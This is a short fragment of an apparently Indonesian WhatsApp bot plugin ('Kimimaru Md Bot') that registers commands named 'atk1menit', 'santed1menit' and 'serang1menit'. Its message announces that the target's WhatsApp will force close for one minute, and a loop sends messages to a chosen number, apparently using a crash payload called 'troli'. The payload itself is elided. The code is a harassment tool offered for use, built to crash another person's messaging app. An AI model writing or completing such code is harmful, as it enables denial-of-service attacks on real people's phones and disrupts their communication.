...
Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 1 Menit Dari sekarang`)
for (let i = 0;i < 2;i++) {
//conn.reply(nomornya + '@s.whatsapp.net', `© Kimimaru Md Bot ✓`, troli)
...
handler.help = ['atk1menit']
handler.command = /^(atk1menit|santed1menit|serang1menit)$/i
